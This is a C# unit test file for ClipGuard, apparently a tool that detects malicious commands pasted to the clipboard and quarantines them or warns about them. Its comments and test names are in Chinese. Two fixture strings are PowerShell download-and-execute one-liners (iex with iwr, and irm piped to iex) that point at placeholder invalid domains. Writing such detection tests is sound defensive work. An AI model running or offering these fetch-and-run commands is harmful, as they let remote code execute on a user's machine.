using ClipGuard.Core;

namespace ClipGuard.Core.Tests;

public class ClipboardGuardStateTests
{
    // 網址都是無效的 example 網域。
    private const string Malicious = "powershell -w hidden -c \"iex(iwr 'https://evil.example.invalid/a.ps1')\"";
    private const string Suspicious = "powershell -c \"irm https://get.example.invalid | iex\"";

    [Fact]
    public void 惡意內容被隔離且保留攔截狀態()
    {
        var s = new ClipboardGuardState();
        Assert.Equal(ClipboardAction.Quarantine, s.OnClipboardText(Malicious));
        Assert.Equal(Malicious, s.Quarantined);
        Assert.True(s.QuarantineActive);
        Assert.Equal(ThreatLevel.Malicious, s.LastVerdict.Level);

        // 我們自己清空剪貼簿引發的通知：狀態不變。
        var gen = s.Generation;
        Assert.Equal(ClipboardAction.None, s.OnClipboardText(null));
        Assert.True(s.QuarantineActive);
        Assert.Equal(gen, s.Generation);
    }

    [Fact]
    public void 可疑內容只提醒()
    {
        var s = new ClipboardGuardState();
        Assert.Equal(ClipboardAction.WarnSuspicious, s.OnClipboardText(Suspicious));
        Assert.Equal(ThreatLevel.Suspicious, s.Level);
        Assert.Null(s.Quarantined);
    }

    [Fact]
    public void 使用者複製別的文字後不再算剛攔截()
    {
        var s = new ClipboardGuardState();
        s.OnClipboardText(Malicious);
        s.OnClipboardText(null);
        Assert.Equal(ClipboardAction.None, s.OnClipboardText("hello"));
        Assert.False(s.QuarantineActive);
        Assert.Equal(ThreatLevel.None, s.Level);
        Assert.Equal(Malicious, s.Quarantined); // 仍可從選單還原
    }

    [Fact]
    public void 還原後不會再被攔截_即使通知來了很多次()
    {
        var s = new ClipboardGuardState();
        s.OnClipboardText(Malicious);
        s.OnClipboardText(null);

        Assert.Equal(Malicious, s.BeginRestore());
        // 寫入剪貼簿引發的通知可能在寫入回報完成之前或之後、而且不只一次。
        Assert.Equal(ClipboardAction.None, s.OnClipboardText(Malicious));
        s.EndRestore(succeeded: true);
        Assert.Equal(ClipboardAction.None, s.OnClipboardText(Malicious));

        Assert.Null(s.Quarantined);
        Assert.False(s.QuarantineActive);
        Assert.Equal(ThreatLevel.Suspicious, s.Level); // 執行入口仍溫和提醒
    }

    [Fact]
    public void 還原通知沒來也不會吃掉下一次真正的複製()
    {
        var s = new ClipboardGuardState();
        s.OnClipboardText(Malicious);
        s.BeginRestore();
        s.EndRestore(succeeded: true);
        // 沒收到還原引發的通知，直接是使用者的下一次複製。
        Assert.Equal(ClipboardAction.WarnSuspicious, s.OnClipboardText(Suspicious));
    }

    [Fact]
    public void 還原後複製別的內容_同一段惡意指令再出現仍會攔截()
    {
        var s = new ClipboardGuardState();
        s.OnClipboardText(Malicious);
        s.BeginRestore();
        s.EndRestore(succeeded: true);
        s.OnClipboardText(Malicious);
        s.OnClipboardText("hello");
        Assert.Equal(ClipboardAction.Quarantine, s.OnClipboardText(Malicious));
    }

    [Fact]
    public void 還原失敗時保留隔離內容也不信任它()
    {
        var s = new ClipboardGuardState();
        s.OnClipboardText(Malicious);
        s.BeginRestore();
        s.EndRestore(succeeded: false);
        Assert.Equal(Malicious, s.Quarantined);
        Assert.Equal(ClipboardAction.Quarantine, s.OnClipboardText(Malicious));
    }

    [Fact]
    public void 沒有隔離內容時不能還原()
    {
        Assert.Null(new ClipboardGuardState().BeginRestore());
    }

    [Fact]
    public void 每次內容變動都換世代()
    {
        var s = new ClipboardGuardState();
        var g0 = s.Generation;
        s.OnClipboardText("a");
        var g1 = s.Generation;
        s.OnClipboardText(null);
        Assert.True(g1 > g0);
        Assert.True(s.Generation > g1);
    }
}
